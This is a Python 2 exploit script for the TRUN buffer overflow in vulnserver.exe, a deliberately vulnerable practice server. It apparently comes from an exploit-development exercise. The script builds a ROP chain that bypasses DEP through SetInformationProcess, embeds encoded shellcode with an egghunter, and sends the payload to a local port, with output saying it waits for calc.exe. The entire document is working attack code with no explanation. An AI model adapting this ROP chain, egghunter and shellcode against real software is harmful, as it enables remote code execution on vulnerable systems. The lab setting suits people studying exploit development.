import socket,struct

print "|=---------vulnserver.exe-TRUN-overflow-egghunter-DEP-bypass=---------=|\n"

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    # !mona rop -cp nonull -m *.dll 
    rop_gadgets = [
      0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
      0x77dd1404,  # ptr to &SetInformationProcess() [IAT ADVAPI32.dll]
      0x77e82d04,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] 
      0x77eb2417,  # XCHG EAX,EBP # RETN [RPCRT4.dll] 
      0x77e25eef,  # POP EAX # RETN [ADVAPI32.dll] 
      0xffffffde,  # Value to negate, will become 0x00000022
      0x77edb167,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77c58fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll] 
      0x77c1f7c9,  # POP ECX # RETN [msvcrt.dll] 
      0x629c0209,  # &0x00000002 [LPK.DLL]
      0x77ee4ad9,  # POP EBX # RETN [RPCRT4.dll] 
      0xffffffff,  # 0xffffffff-> ebx
      0x77c34fcd,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffffc,  # Value to negate, will become 0x00000004
      0x71a7c15c,  # NEG EAX # RETN [mswsock.dll] 
      0x71a748c1,  # POP EDI # RETN [mswsock.dll] 
      0x71a748c1,  # skip 4 bytes [mswsock.dll]
      0x71a6131a,  # PUSHAD # RETN [mswsock.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

shellcode = (
"w00tw00t" # egg
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd" 
)
egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa"
"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

payload = shellcode + "\x90" * (2006-len(shellcode)-20)
payload += "\x90" * 20 # padding
payload += rop_chain 
payload += "\x90" * 20 # padding
payload += egghunter

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 9999))
    s.send("TRUN ." + payload)
    print "[+] Payload sent!"
    print "[+] Waiting for the calc.exe.."
except Exception as e:
    print "[-] {}".format(e)
